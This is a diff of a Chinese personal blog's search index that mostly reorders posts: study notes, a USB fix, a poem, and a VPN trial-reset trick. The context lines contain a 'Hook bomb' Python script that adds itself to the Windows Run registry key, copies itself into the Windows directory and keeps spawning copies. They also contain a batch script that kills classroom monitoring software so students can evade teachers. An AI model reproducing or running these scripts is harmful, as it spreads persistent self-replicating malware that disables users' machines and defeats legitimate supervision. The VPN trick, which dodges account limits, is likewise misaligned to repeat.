@@ -40,6 +40,27 @@
       </tags>
   </entry>
   <entry>
+    <title>初中生物重要知识点总结</title>
+    <url>/posts/60968/</url>
+    <content><![CDATA[<p>初中生物重要知识点总结，仅供复习参考。<br />
+大部分内容来自《万唯中考试题研究》和各种各样的考试，其中一部分是我的错题。</p>
+<span id="more"></span>
+<p><img src="/post-images/001147de777b66f07a51de1c6929d47d.jpg" alt="" /><br />
+<img src="/post-images/d7548989259d796a36c0e60210a48b98.jpg" alt="" /><br />
+<img src="/post-images/60c6fa7e507b1a3dadafed0a70d78f37.jpg" alt="" /><br />
+<img src="/post-images/8f4255e7859fdd2760a9c27b290478d5.jpg" alt="" /><br />
+<img src="/post-images/28b15c21afb917dd5683a3acc4f89920.jpg" alt="" /><br />
+<img src="/post-images/4214d3bab285a07cc49a7b57b61064b0.jpg" alt="" /><br />
+<img src="/post-images/53fa669854d7e92a9d8f961ee33c74b1.jpg" alt="" /></p>
+]]></content>
+      <categories>
+        <category>文化课</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>重新排列 Windows“新建”菜单的顺序</title>
     <url>/posts/63324/</url>
     <content><![CDATA[<p>为了方便使用，我的 Windows 电脑进行了许多个性化设置。比如我重新排列了“新建”菜单各个项目的顺序。</p>
@@ -79,24 +100,32 @@
       </tags>
   </entry>
   <entry>
-    <title>初中生物重要知识点总结</title>
-    <url>/posts/60968/</url>
-    <content><![CDATA[<p>初中生物重要知识点总结，仅供复习参考。<br />
-大部分内容来自《万唯中考试题研究》和各种各样的考试，其中一部分是我的错题。</p>
-<span id="more"></span>
-<p><img src="/post-images/001147de777b66f07a51de1c6929d47d.jpg" alt="" /><br />
-<img src="/post-images/d7548989259d796a36c0e60210a48b98.jpg" alt="" /><br />
-<img src="/post-images/60c6fa7e507b1a3dadafed0a70d78f37.jpg" alt="" /><br />
-<img src="/post-images/8f4255e7859fdd2760a9c27b290478d5.jpg" alt="" /><br />
-<img src="/post-images/28b15c21afb917dd5683a3acc4f89920.jpg" alt="" /><br />
-<img src="/post-images/4214d3bab285a07cc49a7b57b61064b0.jpg" alt="" /><br />
-<img src="/post-images/53fa669854d7e92a9d8f961ee33c74b1.jpg" alt="" /></p>
+    <title>解决一部分 Windows 下 U 盘插入无反应的问题</title>
+    <url>/posts/9849/</url>
+    <content><![CDATA[<p>本文适用情况：</p>
+<ul>
+<li>U 盘硬件正常，原来还能用；</li>
+<li>电脑能用，计算机管理没被禁用；</li>
+<li><strong>插入 U 盘后电脑发出提示音，但文件资源管理器无反应</strong>。</li>
+</ul>
+<p>具体的解决步骤如下：</p>
+<ol>
+<li>同时按下 <code>Win + R</code>，打开运行窗口：<br />
+<img src="/post-images/a07f4dbcd00f6ebe1aa67e2003b4c8bb.png" alt="" /></li>
+<li>输入 <code>%windir%\system32\compmgmt.msc /s</code>，回车运行，打开<strong>计算机管理</strong>页面：<br />
+<img src="/post-images/435d3074ffd8918189c935e05e73c16f.png" alt="" /></li>
+<li>系统工具 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 右边栏：通用串行总线控制器 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> USB 大容量存储设备。左键单击选中它。</li>
+<li>右键：卸载设备。<br />
+<img src="/post-images/ee1d1e70e4ef9f843ead49258345657d.png" alt="" />刷新之后一定是没有这一项才算成功。</li>
+<li>重新插拔 U 盘，完成。<br />
+<img src="/post-images/c401d6bb9f8e403f474dc03f22474e97.png" alt="" /></li>
+</ol>
 ]]></content>
       <categories>
-        <category>文化课</category>
+        <category>计算机</category>
       </categories>
       <tags>
-        <tag>笔记</tag>
+        <tag>教程</tag>
       </tags>
   </entry>
   <entry>
@@ -157,69 +186,6 @@
       </tags>
   </entry>
   <entry>
-    <title>解决一部分 Windows 下 U 盘插入无反应的问题</title>
-    <url>/posts/9849/</url>
-    <content><![CDATA[<p>本文适用情况：</p>
-<ul>
-<li>U 盘硬件正常，原来还能用；</li>
-<li>电脑能用，计算机管理没被禁用；</li>
-<li><strong>插入 U 盘后电脑发出提示音，但文件资源管理器无反应</strong>。</li>
-</ul>
-<p>具体的解决步骤如下：</p>
-<ol>
-<li>同时按下 <code>Win + R</code>，打开运行窗口：<br />
-<img src="/post-images/a07f4dbcd00f6ebe1aa67e2003b4c8bb.png" alt="" /></li>
-<li>输入 <code>%windir%\system32\compmgmt.msc /s</code>，回车运行，打开<strong>计算机管理</strong>页面：<br />
-<img src="/post-images/435d3074ffd8918189c935e05e73c16f.png" alt="" /></li>
-<li>系统工具 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 右边栏：通用串行总线控制器 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> USB 大容量存储设备。左键单击选中它。</li>
-<li>右键：卸载设备。<br />
-<img src="/post-images/ee1d1e70e4ef9f843ead49258345657d.png" alt="" />刷新之后一定是没有这一项才算成功。</li>
-<li>重新插拔 U 盘，完成。<br />
-<img src="/post-images/c401d6bb9f8e403f474dc03f22474e97.png" alt="" /></li>
-</ol>
-]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>南柯子·游甘肃</title>
-    <url>/posts/26400/</url>
-    <content><![CDATA[<p>崆峒圣道源，三家合一山。麦积栈道入云端。黄帝问道，高山月夜寒。<br />
-子美客天水，太白过南山。黄河石林竦峙千。马踏飞燕，过了小西天。</p>
-<p><img src="/post-images/49ba673d516a87dba324f5a4d8dd4391.jpg" alt="" /><br />
-<img src="/post-images/10dc457479ba5aec4f935c7a3745f7a2.jpg" alt="" /><br />
-<img src="/post-images/5bfcfacde800dd8ae08eda997432bea1.jpg" alt="" /><br />
-<img src="/post-images/0ec6be33b055c240ce9bf157ab95bd5d.jpg" alt="" /><br />
-<img src="/post-images/1b649567d66a799176d93ee8a7c9f969.jpg" alt="" /><br />
-<img src="/post-images/cc41107c42ad0f37df97b07111df06ae.jpg" alt="" /><br />
-<img src="/post-images/04338ab373d51416e88ac8901af3aae7.jpg" alt="" /><br />
-<img src="/post-images/2e95a6cf36d9f1c47094d5d9b29c1365.jpg" alt="" /><br />
-<img src="/post-images/c5fdcdaf67429abbcf54198fbc294bda.jpg" alt="" /></p>
-<hr />
-<p>吃货属性爆发！~</p>
-<p><img src="/post-images/9f95560534d0f4feb31d438d7b83f666.jpg" alt="" /><br />
-<img src="/post-images/f882dc6e20e9bff29c5578c18a8f3acb.jpg" alt="" /><br />
-<img src="/post-images/4a78b2a14521a9186d53c9c0d77a5593.jpg" alt="" /><br />
-<img src="/post-images/c356cbf6ae7a0278f75ee1e7c9fb8746.jpg" alt="" /><br />
-<img src="/post-images/696d314abcec52306907ca5e972df506.jpg" alt="" /><br />
-<img src="/post-images/ae02fbc2b1be7d0c45a585c377fff5a4.jpg" alt="" /><br />
-<img src="/post-images/f7681d254870049e3b6219d940e3da2b.jpg" alt="" /><br />
-<img src="/post-images/bfbe0eb421607b0eb63418e4ea122a20.jpg" alt="" /><br />
-<img src="/post-images/72b26710e6f0e77b89c861eefde009c0.jpg" alt="" /></p>
-]]></content>
-      <categories>
-        <category>诗词</category>
-      </categories>
-      <tags>
-        <tag>诗词</tag>
-        <tag>图册</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>利用 ClipboardJS 实现代码块复制按钮</title>
     <url>/posts/60862/</url>
     <content><![CDATA[<p>这是我的网站（此处特指 <a href="https://daoxi365.github.io/tech-blog/">https://daoxi365.github.io/tech-blog/</a>）的一个新特性——“复制”按钮。</p>
@@ -277,6 +243,40 @@
       </tags>
   </entry>
   <entry>
+    <title>南柯子·游甘肃</title>
+    <url>/posts/26400/</url>
+    <content><![CDATA[<p>崆峒圣道源，三家合一山。麦积栈道入云端。黄帝问道，高山月夜寒。<br />
+子美客天水，太白过南山。黄河石林竦峙千。马踏飞燕，过了小西天。</p>
+<p><img src="/post-images/49ba673d516a87dba324f5a4d8dd4391.jpg" alt="" /><br />
+<img src="/post-images/10dc457479ba5aec4f935c7a3745f7a2.jpg" alt="" /><br />
+<img src="/post-images/5bfcfacde800dd8ae08eda997432bea1.jpg" alt="" /><br />
+<img src="/post-images/0ec6be33b055c240ce9bf157ab95bd5d.jpg" alt="" /><br />
+<img src="/post-images/1b649567d66a799176d93ee8a7c9f969.jpg" alt="" /><br />
+<img src="/post-images/cc41107c42ad0f37df97b07111df06ae.jpg" alt="" /><br />
+<img src="/post-images/04338ab373d51416e88ac8901af3aae7.jpg" alt="" /><br />
+<img src="/post-images/2e95a6cf36d9f1c47094d5d9b29c1365.jpg" alt="" /><br />
+<img src="/post-images/c5fdcdaf67429abbcf54198fbc294bda.jpg" alt="" /></p>
+<hr />
+<p>吃货属性爆发！~</p>
+<p><img src="/post-images/9f95560534d0f4feb31d438d7b83f666.jpg" alt="" /><br />
+<img src="/post-images/f882dc6e20e9bff29c5578c18a8f3acb.jpg" alt="" /><br />
+<img src="/post-images/4a78b2a14521a9186d53c9c0d77a5593.jpg" alt="" /><br />
+<img src="/post-images/c356cbf6ae7a0278f75ee1e7c9fb8746.jpg" alt="" /><br />
+<img src="/post-images/696d314abcec52306907ca5e972df506.jpg" alt="" /><br />
+<img src="/post-images/ae02fbc2b1be7d0c45a585c377fff5a4.jpg" alt="" /><br />
+<img src="/post-images/f7681d254870049e3b6219d940e3da2b.jpg" alt="" /><br />
+<img src="/post-images/bfbe0eb421607b0eb63418e4ea122a20.jpg" alt="" /><br />
+<img src="/post-images/72b26710e6f0e77b89c861eefde009c0.jpg" alt="" /></p>
+]]></content>
+      <categories>
+        <category>诗词</category>
+      </categories>
+      <tags>
+        <tag>诗词</tag>
+        <tag>图册</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用 Python 快速占满内存（Hook 炸弹）</title>
     <url>/posts/51755/</url>
     <content><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Author:PanDaoxi </span></span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> Tk,Label</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system,name,environ</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">title = <span class="string">&quot;Message&quot;</span></span><br><span class="line">message = <span class="string">&quot;不好意思，您的电脑废了&quot;</span></span><br><span class="line">loops = []</span><br><span class="line">window = Tk()</span><br><span class="line">width = window.winfo_screenwidth()</span><br><span class="line">height = window.winfo_screenheight()</span><br><span class="line">x = randint(<span class="number">0</span>,width)</span><br><span class="line">y = randint(<span class="number">0</span>,height)</span><br><span class="line">window.geometry(<span class="string">&quot;350x50+&quot;</span> + <span class="built_in">str</span>(x) + <span class="string">&quot;+&quot;</span> + <span class="built_in">str</span>(y))</span><br><span class="line">window.title(title)</span><br><span class="line">window.resizable(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">path = environ[<span class="string">&quot;windir&quot;</span>]</span><br><span class="line">system(<span class="string">&#x27;start /min cmd /c reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;funnywindows&quot; /t REG_SZ /d &quot;%s&quot; /f&#x27;</span> % __file__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> loops,window</span><br><span class="line">    Label(window,text=message,font=(<span class="string">&#x27;Microsoft YaHei&#x27;</span>,<span class="number">20</span>)).pack()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        text = f.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">        content = <span class="string">&quot;%s\\%d.py&quot;</span> % (path,randint(<span class="number">100000</span>,<span class="number">999999</span>))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(content,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(text)</span><br><span class="line">        loops.append(content)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">        system(<span class="string">&quot;start /min cmd /c python %s&quot;</span> % loops[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span> <span class="keyword">and</span> name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    showerror(<span class="string">&quot;Message&quot;</span>,<span class="string">&quot;无法运行程序，原因可能是：\n(1)您非主动运行程序。\n(2)这个程序不能在当前系统下运行，请尝试其他操作系统。&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line">window.mainloop()</span><br></pre></td></tr></table></figure>
@@ -307,6 +307,31 @@
 <p>但是我不敢承诺你的老师是否会来线下找你。如果来找，我就帮不了你啦！</p>
 <p>此外，我制作了一个全平台破解工具，如果你不想敲命令，也可以带上 U 盘，运行以下批处理文件。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">echo</span> off</span><br><span class="line">title 机房软件杀手</span><br><span class="line">net session &gt;nul <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> %errorlevel% == <span class="number">0</span> (</span><br><span class="line">    <span class="keyword">goto</span> main</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">	<span class="keyword">echo</span> 错误：</span><br><span class="line">	<span class="keyword">echo</span>. </span><br><span class="line">	<span class="keyword">echo</span> 您需要使用管理员权限运行此程序！</span><br><span class="line">	<span class="keyword">echo</span> 解决方法：</span><br><span class="line">	<span class="keyword">echo</span> ①退出此程序（按键盘上任意键退出程序）；</span><br><span class="line">	<span class="keyword">echo</span> ②右键单击此程序，选择“以管理员身份运行”；</span><br><span class="line">	<span class="keyword">echo</span> ③授予运行权限即可。</span><br><span class="line">	pause &gt; nul</span><br><span class="line">	<span class="keyword">exit</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">:main</span><br><span class="line"><span class="keyword">echo</span> 程序将自动选择计算机上已经安装的电子课堂，但不保证一定退出成功。</span><br><span class="line"><span class="keyword">echo</span> 目前支持的机房软件：极域（青葡萄）电子教室、红蜘蛛、伽卡他卡、苏亚星。</span><br><span class="line"><span class="keyword">echo</span> 是否要立即开始关闭机房软件？（按键盘上任意键继续）</span><br><span class="line"><span class="keyword">echo</span> （请小心老师私下武力解决）</span><br><span class="line">pause &gt; nul</span><br><span class="line"><span class="keyword">echo</span>.</span><br><span class="line"></span><br><span class="line">tasklist | find /i <span class="string">&quot;StudentMain.exe&quot;</span></span><br><span class="line"><span class="keyword">if</span> %errorlevel% == <span class="number">0</span> (</span><br><span class="line">	<span class="keyword">echo</span> 已发现：极域（青葡萄）电子教室</span><br><span class="line">	taskkill /im <span class="string">&quot;StudentMain.exe&quot;</span> /t /f</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">	<span class="keyword">echo</span> 未发现：极域（青葡萄）电子教室</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">tasklist | find /i <span class="string">&quot;redAgent.exe&quot;</span></span><br><span class="line"><span class="keyword">if</span> %errorlevel% == <span class="number">0</span> (</span><br><span class="line">	<span class="keyword">echo</span> 已发现：红蜘蛛软件</span><br><span class="line">	taskkill /im <span class="string">&quot;redAgent.exe&quot;</span> /im <span class="string">&quot;checkrs.exe&quot;</span> /im <span class="string">&quot;rscheck.exe&quot;</span> /f</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">	<span class="keyword">echo</span> 未发现：红蜘蛛软件</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">tasklist | find /i <span class="string">&quot;student.exe&quot;</span></span><br><span class="line"><span class="keyword">if</span> %errorlevel% == <span class="number">0</span> (</span><br><span class="line">	<span class="keyword">echo</span> 已发现：伽卡他卡、苏亚星</span><br><span class="line">	taskkill /im <span class="string">&quot;student.exe&quot;</span> /f /t</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">	<span class="keyword">echo</span> 未发现：伽卡他卡、苏亚星</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>.</span><br><span class="line"><span class="keyword">echo</span> 处理完成。（按键盘上任意键退出程序）</span><br><span class="line"><span class="keyword">echo</span> 程序作者：Luogu @PanDaoxi</span><br><span class="line">pause &gt; nul</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>教程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows 下破解 Whale（VPN 白鲸加速器）的登录限制</title>
+    <url>/posts/19534/</url>
+    <content><![CDATA[<blockquote>
+<p>声明：<br />
+本人不存在利用 VPN 进行诈骗等，涉及违反法律的任何行为。只是用来看 Gmail 的。<br />
+<strong>如果某人利用文章提供的信息实施法律所禁止的行为，与本文原作者 PanDaoxi 无关。</strong><br />
+法不可违！</p>
+</blockquote>
+<p><a href="https://m.bj1ch.com/">https://m.bj1ch.com/</a></p>
+<hr />
+<ol>
+<li>退出加速器。</li>
+<li>打开 <code>%programdata%</code> 目录。</li>
+<li>删除 <code>Whale</code> 文件夹。</li>
+<li>重新打开加速器，注册一个帐号即可白嫖。</li>
+</ol>
+]]></content>
       <categories>
         <category>计算机</category>
       </categories>
@@ -615,31 +640,6 @@
 <p>……</p>
 <p>完结撒花！✨</p>
 <p>更多内容，欢迎关注：<a href="https://www.luogu.com.cn/user/593403"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>Luogu @PanDaoxi</mtext></mrow><annotation encoding="application/x-tex">\text{Luogu @PanDaoxi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord text"><span class="mord">Luogu @PanDaoxi</span></span></span></span></span></a></p>
-]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows 下破解 Whale（VPN 白鲸加速器）的登录限制</title>
-    <url>/posts/19534/</url>
-    <content><![CDATA[<blockquote>
-<p>声明：<br />
-本人不存在利用 VPN 进行诈骗等，涉及违反法律的任何行为。只是用来看 Gmail 的。<br />
-<strong>如果某人利用文章提供的信息实施法律所禁止的行为，与本文原作者 PanDaoxi 无关。</strong><br />
-法不可违！</p>
-</blockquote>
-<p><a href="https://m.bj1ch.com/">https://m.bj1ch.com/</a></p>
-<hr />
-<ol>
-<li>退出加速器。</li>
-<li>打开 <code>%programdata%</code> 目录。</li>
-<li>删除 <code>Whale</code> 文件夹。</li>
-<li>重新打开加速器，注册一个帐号即可白嫖。</li>
-</ol>
 ]]></content>
       <categories>
         <category>计算机</category>
